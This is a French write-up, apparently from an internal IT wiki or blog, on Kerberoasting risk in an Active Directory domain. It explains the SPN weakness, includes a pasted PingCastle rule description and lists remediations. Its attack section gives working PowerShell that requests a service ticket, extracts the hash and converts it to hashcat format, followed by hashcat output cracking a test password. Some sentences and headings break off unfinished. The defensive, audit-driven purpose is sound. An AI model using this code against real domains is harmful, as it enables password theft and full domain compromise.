---
title: "Le Kerberoasting avec PowerShell"
description: ""
listed: true
---

## Contexte et explication

Lors d'un lancement d'un audit Ping Castle, vous êtes peut-être tombé sur la vulnérabilité "P-Kerberoasting" dans votre domaine (attaque Kerberoasting). Cette faille de sécurité est classée au niveau 1 de criticité (le plus élevé) par l'ANSSI et représente un **gros risque** pour votre Active Directory.

Le principe est simple : un compte avec un haut niveau de privilège dans votre annuaire possède une valeur inscrite dans son attribut `servicePrincipalName`.

### Fonctionnement du ServicePrincipalName

L'attribut `servicePrincipalName` permet plusieurs choses dans Active Directory :

- **Identification d'un service :** Il permet à Kerberos de savoir quel service un utilisateur veut contacter. Par exemple, `HTTPS/server.contoso.com:443` identifie un serveur web, ou `MSSQLSvc/server.contoso.com` pour une base de données.
- **Authentification sécurisée :** Kerberos utilise le SPN pour générer un ticket d'accès (TGS) chiffré avec le mot de passe de l'utilisateur qui porte le `servicePrincipalName`.

Le principal problème lié au SPN est que **n'importe quel utilisateur du domaine** peut demander un ticket d'accès pour le compte qui porte le SPN. Un attaquant ayant donc obtenu un compte dans le domaine, 



### Danger du K



Description:
The purpose is to ensure that the password of admin accounts cannot be retrieved using the Kerberoast attack.

Technical Explanation:
To access a service using Kerberos, a user requests a ticket (named TGS) to the DC specific to the service.
This ticket is encrypted using a derivative of the service password, but can be brute-forced to retrieve the original password.
Any account having the attribute SPN populated is considered as a service account.
Given that any user can request a ticket for a service account, these accounts can have their password retrieved.
In addition, services are known to have their password not changed at a regular basis and to use well-known words.

Please note that this program ignores service accounts that had their password changed in the last 40 days ago to support using password rotation as a mitigation.

Advised Solution:
If the account is a service account, the service should be removed from the privileged group or have a process to change its password at a regular basis.
If the user is a person, the SPN attribute of the account should be removed.






## Fonctionnement

### Contexte

Actuellement, le compte `admin-service` est considéré comme la faille la plus critique du domaine Active Directory SDIS29.LOCAL pour les raisons suivantes :

- Il est "administrateur du domaine", le niveau de privilège le plus élevé possible
- Il contient au moins un SPN (ServicePrincipalName) qui permet son utilisation depuis plusieurs serveurs/services

Cette combinaison fait de ce compte une cible parfaite pour l'attaque **Kerberoasting**.

### Fonctionnement de l'attaque

L'attaque Kerberoasting consiste à demander un ticket Kerberos (protocole d'authentification Active Directory) en utilisant un SPN présent sur le compte cible. Cette opération ne requiert aucun privilège, aucune connaissance de Kerberos et peut donc être réalisée par **n'importe quel utilisateur du domaine**.

Ici le seul prérequis pour l'attaquant est donc de récupérer un compte parmi les +3000 présents dans le domaine et d'avoir accès au réseau.

Une fois le ticket récupéré, il ne reste plus qu'à le craquer hors ligne (attaque par dictionnaire ou bruteforce). Suivant la longueur du mot de passe et l'algorithme de chiffrement, cela peut être plus ou moins long.

Une fois le mot de passe craqué, l'attaquant récupère le mot de passe du compte de service (qui dans notre cas est administrateur du domaine) et il sera en mesure de contrôler l'intégralité de Active Directory.

Cette vulnérabilité permet donc une escalade d'un utilisateur sans aucun privilège vers le niveau le plus élevé de privilège dans Active Directory **en une seule étape**.

### Solutions

Dans notre cas, il n'y a que deux solutions possibles :

- Réduire le niveau de privilèges du compte `admin-service` pour éviter qu'il puisse compromettre l'intégralité du domaine
- Supprimer **tous** les SPN du compte `admin-service`

Les autres solutions (chiffrement Kerberos renforcé avec AES256, mots de passe plus long et changement fréquent du mot de passe) ne doivent pas être considérées comme des solutions viables sur le long terme.

## Attaque

Création d'un utilisateur avec SPN :

```powershell
$splat = @{
    Name              = 'SMITH John'
    Enabled           = $true
    SamAccountName    = 'smithjo'
    UserPrincipalName =  'smithjo@sdis29.local'
    AccountPassword   = ('ZombieKiller2008' | ConvertTo-SecureString -AsPlainText -Force)
    Path              = 'OU=Autres Situations Administratives,OU=Utilisateurs,DC=sdis29,DC=local'
    OtherAttributes   = @{
        ServicePrincipalName = 'MSSQLSvc/server.sdis29.local'
    }
}
New-ADUser @splat
```

Source du code : [Empire/data/module_source/credentials/Invoke-Kerberoast.ps1 at master · EmpireProject/Empire · GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1#L660)

Récupération d'un SPN (n'importe lequel) :

```powershell
$domain = (Get-ADDomain).DNSRoot
$user = Get-ADUser smithjo -Properties servicePrincipalName
$sam = $user.SamAccountName
$spn = $user.servicePrincipalName[-1]
```

Création d'un ticket Kerberos :

```powershell
$ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::New($spn)
```

Récupération du hash du ticket :

```powershell
$ticketByteStream = $ticket.GetRequest()
$TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
$TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)'
$etype = [Convert]::ToByte($Matches.EtypeLen, 16)
$cipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
$cipherText = $Matches.DataToEnd.Substring(0,$cipherTextLen*2)
$hash = "$($cipherText.Substring(0,32))`$$($cipherText.Substring(32))"
```

Conversion du hash vers le format hashcat :

```powershell
$hashcatFormat = '$krb5tgs$' + $etype + '$*' + $sam + '$' + $domain + '$' + $spn + '*$' + $hash
$hashcatFormat | Set-Clipboard
```

On peut alors essayer de casser le hash avec [hashcat](https://hashcat.net/hashcat/) :

```plaintext
.\hashcat.exe -a 0 .\hash.txt .\kerberoast_pws.txt
```

Le dictionnaire utilisé est le suivant : [edermi Kerberoast PW list (XZ format) · GitHub](https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b)

Et au bout de quelques dizaines de secondes de traitement, on obtient le mot de passe en clair : `ZombieKiller2008`

```plaintext
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) Iris(R) Xe Graphics, 3552/7176 MB (1794 MB allocatable), 96MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 210 MB

Dictionary cache hit:
* Filename..: .\kerberoast_pws.txt
* Passwords.: 35638385
* Bytes.....: 404901152
* Keyspace..: 35638385

$krb5tgs$23$*smithjo$sdis29.local$MSSQLSvc/server.sdis29.local*$abf9befd[...]f3ea6085:ZombieKiller2008

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*smithjo$sdis29.local$MSSQLSvc/server.s...ea6085
Time.Started.....: Wed Jun 25 11:04:25 2025 (47 secs)
Time.Estimated...: Wed Jun 25 11:05:12 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\kerberoast_pws.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   765.6 kH/s (7.39ms) @ Accel:16 Loops:1 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 35561472/35638385 (99.78%)
Rejected.........: 0/35561472 (0.00%)
Restore.Point....: 35549184/35638385 (99.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: (zoeyis3) -> Zoogbroeders?

Started: Wed Jun 25 11:04:25 2025
Stopped: Wed Jun 25 11:05:13 2025
```
